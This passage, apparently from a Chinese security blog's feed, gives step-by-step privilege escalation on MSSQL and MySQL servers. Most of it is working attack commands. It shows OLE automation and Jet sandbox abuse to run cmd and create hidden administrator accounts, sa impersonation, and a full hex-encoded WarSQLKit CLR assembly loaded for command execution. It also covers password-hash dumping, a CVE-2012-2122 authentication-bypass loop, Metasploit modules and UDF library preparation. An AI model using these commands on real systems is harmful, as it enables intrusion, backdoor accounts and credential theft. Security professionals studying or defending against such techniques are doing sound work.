exec sp_oacreate &#39;Shell.Application&#39;, @o out
exec sp_oamethod @o, &#39;ShellExecute&#39;,null, &#39;cmd.exe&#39;,&#39;cmd /c net user &amp;gt;c:\test.txt&#39;,&#39;c:\windows\system32&#39;,&#39;&#39;,&#39;1&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;启动项写用户&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;declare @sp_passwordxieo int, @f int, @t int, @ret int
exec sp_oacreate &#39;scripting.filesystemobject&#39;, @sp_passwordxieo out
exec sp_oamethod @sp_passwordxieo, &#39;createtextfile&#39;, @f out, &#39;d:\RECYCLER\1.vbs&#39;, 1
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;set wsnetwork=CreateObject(&amp;quot;WSCRIPT.NETWORK&amp;quot;)&#39;
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;os=&amp;quot;WinNT://&amp;quot;&amp;amp;wsnetwork.ComputerName&#39;
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;Set ob=GetObject(os)&#39;
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;Set oe=GetObject(os&amp;amp;&amp;quot;/Administrators,group&amp;quot;)&#39;
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;Set od=ob.Create(&amp;quot;user&amp;quot;,&amp;quot;123$&amp;quot;)&#39;
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;od.SetPassword &amp;quot;123&amp;quot;&#39;
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;od.SetInfo&#39;
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;Set of=GetObject(os&amp;amp;&amp;quot;/123$&amp;quot;,user)&#39;
exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;oe.add os&amp;amp;&amp;quot;/123$&amp;quot;&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;知晓路径并可写情况下，也可以将命令执行结果写入网站目录下，再去读取该文件即可&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;declare @shell int;
exec sp_oacreate &#39;wscript.shell&#39;,@shell output;
exec sp_oamethod @shell,&#39;run&#39;,null,&#39;C:\\windows\\system32\\cmd.exe /c whoami &amp;gt; C:\\Inetpub\\wwwroot\\tmp.txt&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;sandbox提权&#34;&gt;sandbox提权&lt;/h3&gt;
&lt;p&gt;沙盒模式SandBoxMode是一种安全功能。在沙盒模式下，Access只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。&lt;/p&gt;
&lt;p&gt;例如，诸如Kill和Shell之类的函数可能被用来损坏计算机上的数据和文件，因此它们被视为不安全的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;沙盒提权的原理就是&lt;code&gt;jet.oledb&lt;/code&gt;（修改注册表）执行系统命令。数据库通过查询方式调用&lt;code&gt;mdb&lt;/code&gt;文件，执行参数，绕过系统本身自己的执行命令，实现&lt;code&gt;mdb&lt;/code&gt;文件执行命令。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xp_regwrite&lt;/code&gt; 可用(一般就是SA权限)&lt;/li&gt;
&lt;li&gt;需要&lt;code&gt;Microsoft.Jet.OLEDB.4.0&lt;/code&gt;一般在32位系统才可以，64位机需要12.0，较复杂&lt;/li&gt;
&lt;li&gt;&lt;code&gt;dnary.mdb&lt;/code&gt;和&lt;code&gt;ias.mdb&lt;/code&gt;两个文件 在&lt;code&gt;win2003&lt;/code&gt;上默认存在，也可自行准备&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;利用：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开启Ad Hoc Distributed Queries组件&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exec sp_configure &#39;show advanced options&#39;,1 ;
reconfigure ;
exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1 ;
reconfigure;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;恢复对注册表的读写&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dbcc addextendedproc (&#39;xp_regread&#39;,&#39;xpstar.dll&#39;)
dbcc addextendedproc (&#39;xp_regwrite&#39;,&#39;xpstar.dll&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;开启沙盒模式&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,0
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;参数&lt;code&gt;0&lt;/code&gt;的含义：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0&lt;/code&gt;：在任何所有者中禁止启用安全模式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&lt;/code&gt; ：为仅在允许范围内&lt;/p&gt;
&lt;p&gt;&lt;code&gt;2&lt;/code&gt; ：必须在access模式下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;3&lt;/code&gt;：完全开启&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;利用 jet.oledb 执行系统命令写用户&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39; ,&#39;;database=c:\windows\system32\ias\ias.mdb&#39; ,&#39;select shell(&amp;quot;cmd.exe /c net user hack hack123456 /add&amp;quot;)&#39;)

select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39; ,&#39;;database=c:\windows\system32\ias\ias.mdb&#39; ,&#39;select shell(&amp;quot;cmd.exe /c net localgroup administrators hack /add&amp;quot;)&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;mssql-模拟登录提权&#34;&gt;MSSQL 模拟登录提权&lt;/h3&gt;
&lt;p&gt;该漏洞属于配置不当，开发者允许其他登录用户模拟高权限的用户。&lt;/p&gt;
&lt;h4 id=&#34;赋予某用户模拟登录权限&#34;&gt;赋予某用户模拟登录权限&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 赋予用户 MyUser1 权限来模拟 MyUser2, MyUser3,及sa
USE master;
GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
GO
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;查找可模拟登录的用户&#34;&gt;查找可模拟登录的用户&lt;/h4&gt;
&lt;p&gt;以MyUser1登录后，执行查询：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = &#39;IMPERSONATE&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 96; 
			flex-basis: 231px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218203850110.png&#34; data-size=&#34;396x411&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218203850110.png&#34;
			width=&#34;396&#34;
			height=&#34;411&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218203850110_hu442e083d4c4038e4c66c78e9c0f9f603_72032_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218203850110_hu442e083d4c4038e4c66c78e9c0f9f603_72032_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;模拟用户登录&#34;&gt;模拟用户登录&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 验证模拟前是否为sysadmin权限
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)

# 模拟sa登录
EXECUTE AS LOGIN = &#39;sa&#39;

# 模拟登录后验证是否为sysadmin权限
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 93; 
			flex-basis: 224px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mssql/image-20220218203959097.png&#34; data-size=&#34;360x385&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mssql/image-20220218203959097.png&#34;
			width=&#34;360&#34;
			height=&#34;385&#34;
			srcset=&#34;https://coollllllll.github.io/p/mssql/image-20220218203959097_hu620b363247213289f5b9e80eee93b3c4_76207_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mssql/image-20220218203959097_hu620b363247213289f5b9e80eee93b3c4_76207_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;clr提权&#34;&gt;CLR提权&lt;/h3&gt;
&lt;p&gt;SQL CLR 是 SQL Server2005 出现的新功能，它将 .NET Framework 中的 CLR 服务注入到 SQL Server 中，让 SQL Server 的部分数据库对象可以使用 .NET Framework 的编程语言进行开发(目前只支持VB.NET和C#)，包括存储过程、用户自定义函数、触发器、 用户自定义类型以及用户自定义聚合函数等功能。&lt;/p&gt;
&lt;h4 id=&#34;使用clr执行系统命令&#34;&gt;使用CLR执行系统命令&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#启用MSSQL CLR功能
exec sp_configure &#39;show advanced options&#39;, 1;
RECONFIGURE;
Exec sp_configure &#39;clr enabled&#39;, 1;
RECONFIGURE;
 
#为了导入了不安全的程序集，我们还需要将数据库标记为安全。
ALTER DATABASE [master] SET TRUSTWORTHY ON;
 
#导入程序集，单独执行
CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ffc03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;

#创建存储过程,单独执行
CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;

#执行命令
EXEC sp_cmdExec &#39;whoami&#39;;

#删除该程序集
DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>MySQL 提权</title>
        <link>https://coollllllll.github.io/p/mysql-1/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/mysql-1/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/mysql-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post MySQL 提权" /&gt;&lt;h1 id=&#34;mysql提权&#34;&gt;MySQL提权&lt;/h1&gt;
&lt;h2 id=&#34;mysql权限获取&#34;&gt;MySQL权限获取&lt;/h2&gt;
&lt;h3 id=&#34;数据库操作权限&#34;&gt;数据库操作权限&lt;/h3&gt;
&lt;p&gt;获取数据库操作权限的方法一般有以下几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;3306端口爆破&lt;/li&gt;
&lt;li&gt;从网站的数据库配置文件获取明文密码&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap&lt;/code&gt;工具的 &amp;ndash;os-shell&lt;/li&gt;
&lt;li&gt;基于已知漏洞获取权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;基于注入获取的webshell权限&#34;&gt;基于注入获取的webshell权限&lt;/h3&gt;
&lt;p&gt;通过SQL注入写文件以getshell。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;into outfile&lt;/code&gt;写文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;general_log&lt;/code&gt;写文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;具体原理和细节参见&lt;code&gt;MySQL注入写shell&lt;/code&gt;一文。&lt;/p&gt;
&lt;h3 id=&#34;hash破解&#34;&gt;Hash破解&lt;/h3&gt;
&lt;p&gt;在有SQL注入情况的情况下，依靠注入查询MySQL用户密码Hash，再进行解密：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# MySQL&amp;lt;=5.6
select host, user, password from mysql.user;

# MySQL&amp;gt;=5.7
select host,user,authentication_string from mysql.user;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 538; 
			flex-basis: 1293px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220213173902742.png&#34; data-size=&#34;582x108&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220213173902742.png&#34;
			width=&#34;582&#34;
			height=&#34;108&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220213173902742_hu830fa7b290d2a230e7223f1e1108fbad_17962_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220213173902742_hu830fa7b290d2a230e7223f1e1108fbad_17962_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;随后可用在线网站解密。&lt;/p&gt;
&lt;h3 id=&#34;已知漏洞利用&#34;&gt;已知漏洞利用&lt;/h3&gt;
&lt;h4 id=&#34;yassl缓冲区溢出&#34;&gt;yaSSL缓冲区溢出&lt;/h4&gt;
&lt;p&gt;MSF利用：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 &amp;gt; use exploit/windows/mysql/mysql_yassl_hello
msf6 &amp;gt; use exploit/linux/mysql/mysql_yassl_hello
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;cve-2012-2122&#34;&gt;CVE-2012-2122&lt;/h4&gt;
&lt;p&gt;在知道用户名情况下，多次输入错误的密码(大约每256一次就可蒙对)会有几率可以直接成功登陆进数据库。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;影响范围：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;所有MariaDB和MySQL的5.1.61、5.2.11、5.3.5、5.5.22以下版本都存在漏洞。&lt;/p&gt;
&lt;p&gt;从5.1.62, 5.2.12, 5.3.6, 5.5.23开始的MariaDB版本不受影响。&lt;/p&gt;
&lt;p&gt;从5.1.63, 5.5.24, 5.6.6开始的MySQL版本不受影响。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Linux shell

for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 ; done
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# MSF模块

msf6 &amp;gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用之后可dump出MySQL的hash，再进行破解。&lt;/p&gt;
&lt;h2 id=&#34;udf提权&#34;&gt;UDF提权&lt;/h2&gt;
&lt;p&gt;UDF(user-defined function)是MySQL的一个扩展接口，用户可通过自定义函数来扩展MySQL功能，其新加入的功能函数可以直接在SQL语句中调用，类似调用user()、version()等函数一样。&lt;/p&gt;
&lt;h3 id=&#34;手动实现&#34;&gt;手动实现&lt;/h3&gt;
&lt;h4 id=&#34;动态链接库&#34;&gt;动态链接库&lt;/h4&gt;
&lt;p&gt;当MySQL&amp;gt;=5.1时，必须将UDF的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sqlmap中的动态链接库&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sqlmap根目录/data/udf/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 172; 
			flex-basis: 414px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215103932437.png&#34; data-size=&#34;375x217&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215103932437.png&#34;
			width=&#34;375&#34;
			height=&#34;217&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215103932437_hu1c5e053154d25dd79c60eb82f5dd8c29_15196_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220215103932437_hu1c5e053154d25dd79c60eb82f5dd8c29_15196_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sqlmap中的动态链接库文件是经过编码处理以防止误杀的，不能直接用，可使用自带的解码工具&lt;code&gt;cloak.py&lt;/code&gt;进行解码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# cloak.py所在目录
sqlmap根目录/extra/cloak/cloak.py

# 解码Linux 64位 的动态链接库
python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o udf.so
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;msf中的动态链接库&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf根目录/data/exploits/mysql
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 245; 
			flex-basis: 588px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215105423403.png&#34; data-size=&#34;245x100&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215105423403.png&#34;
			width=&#34;245&#34;
			height=&#34;100&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215105423403_hu32b93a1947f1a5035786ed806fc350c9_6833_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220215105423403_hu32b93a1947f1a5035786ed806fc350c9_6833_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;插件目录&#34;&gt;插件目录&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;show variables like &#39;%plugin%&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 420; 
			flex-basis: 1009px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215105529614.png&#34; data-size=&#34;534x127&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215105529614.png&#34;
			width=&#34;534&#34;
			height=&#34;127&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-1/image-20220215105529614_huae649c661e2770f0d64ba828f568cb57_17232_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-1/image-20220215105529614_huae649c661e2770f0d64ba828f568cb57_17232_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;p&gt;在Windows下当不存在插件目录时，找到安装目录，可以借助NTFS流创建该文件夹(成功率不高)：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select xxx into dumpfile &#39;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#39;;
